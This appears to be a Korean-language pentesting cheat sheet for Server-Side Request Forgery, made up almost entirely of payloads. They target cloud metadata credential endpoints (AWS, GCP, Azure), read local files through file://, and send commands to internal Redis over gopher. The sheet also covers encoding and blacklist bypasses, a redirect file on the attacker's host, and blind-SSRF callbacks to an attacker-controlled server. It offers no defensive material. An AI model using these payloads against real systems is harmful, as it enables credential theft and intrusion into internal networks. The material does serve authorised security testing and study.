---
sidebar_position: 5
---

# Server-Side Request Forgery (SSRF)

## 기본 개념

SSRF는 서버가 공격자가 제어하는 URL로 요청을 보내도록 만드는 공격입니다.

## 기본 페이로드

```
https://<RHOST>/item/2?server=server.<RHOST>/file?id=9&x=
http://<RHOST>/page?url=http://internal-server/admin
http://<RHOST>/fetch?url=http://127.0.0.1:80
```

## 내부 네트워크 스캔

```
# localhost 변형
http://127.0.0.1/
http://localhost/
http://[::1]/
http://0.0.0.0/
http://0177.0.0.1/
http://2130706433/

# 내부 IP 스캔
http://192.168.0.1/
http://192.168.1.1/
http://10.0.0.1/
http://172.16.0.1/
```

## 클라우드 메타데이터

```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Google Cloud
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

## 프로토콜 사용

```
# File protocol
file:///etc/passwd
file:///c:/windows/win.ini

# Dict protocol
dict://127.0.0.1:11211/stats

# LDAP
ldap://127.0.0.1:389

# Gopher (Redis)
gopher://127.0.0.1:6379/_SET%20test%20value
```

## 우회 기법

### URL 인코딩

```
http://127.0.0.1/ → http://%31%32%37%2e%30%2e%30%2e%31/
```

### 이중 URL 인코딩

```
http://127.0.0.1/ → http://%25%33%31%25%33%32%25%33%37%2e%25%33%30%2e%25%33%30%2e%25%33%31/
```

### IP 형식 변경

```
# 10진수
http://2130706433/ (127.0.0.1)

# 8진수
http://0177.0.0.1/

# 16진수
http://0x7f.0x0.0x0.0x1/

# 혼합
http://0177.0.0.1/
http://127.1/
```

### DNS Rebinding

```
# 악의적인 DNS 서버 설정
example.com → 1.2.3.4 (첫 요청)
example.com → 127.0.0.1 (두번째 요청)
```

### 리다이렉트 사용

```php
# redirect.php
<?php header("Location: http://127.0.0.1/admin"); ?>
```

```
http://<RHOST>/fetch?url=http://<LHOST>/redirect.php
```

## 블랙리스트 우회

```
# localhost 우회
http://localtest.me/ (127.0.0.1로 해석)
http://127。0。0。1/ (유니코드)
http://127.0.0.1.nip.io/
http://127.0.0.1.xip.io/
http://[0:0:0:0:0:ffff:127.0.0.1]/

# @ 사용
http://evil.com@127.0.0.1/
http://127.0.0.1@evil.com/

# # 사용
http://127.0.0.1#evil.com/
http://evil.com#127.0.0.1/
```

## 포트 스캔

```
# 내부 포트 스캔
http://127.0.0.1:22/
http://127.0.0.1:80/
http://127.0.0.1:3306/
http://127.0.0.1:6379/
http://127.0.0.1:8080/
```

## Blind SSRF

```bash
# Burp Collaborator 사용
http://burp-collaborator.com

# 자체 서버 사용
http://<LHOST>/callback

# DNS 로그 확인
http://ssrf-test.<YOUR_DOMAIN>/
```

## 참고

- SSRF로 내부 네트워크 접근 가능
- 클라우드 메타데이터에서 자격증명 탈취
- 포트 스캔으로 내부 서비스 발견
- Blind SSRF는 Out-of-Band 기법 사용
- file:// 프로토콜로 로컬 파일 읽기 가능
